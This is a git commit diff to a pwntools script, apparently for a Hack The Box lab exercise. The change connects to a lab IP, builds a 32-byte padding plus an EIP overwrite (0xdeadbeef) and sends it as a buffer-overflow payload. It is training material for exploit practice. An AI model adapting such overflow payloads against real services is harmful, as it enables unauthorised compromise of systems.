8460e2506b9b4f5820e0f7fa50c45065c71edcf6
reesdanny <39764146+reesdanny@users.noreply.github.com>
2021-12-28 14:32:10 +0000

    Update basic.py

--- pwn/HTB/basic.py
+++ pwn/HTB/basic.py
@@ -5,13 +5,25 @@
 #jaaa
 
 from pwn import *
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+	
+context.log_level = 'debug'
 
-#padding = cyclic(100)
-padding = cyclic(cyclic_find('jaaa'))
+connect = remote('10.10.102.104','1337')
+
+print(connect.recvn(18))
+
+padding = b'A'*32
+#padding = cyclic(32)
+#padding = cyclic(cyclic_find('jaaa'))
 
 #check the padding is correct p32 or p64
 eip= p32(0xdeadbeef)
 
 payload = padding + eip
-
 print(payload)
+
+connect.send(payload)
+print(connect.recvn(34))
+
+#print(payload)
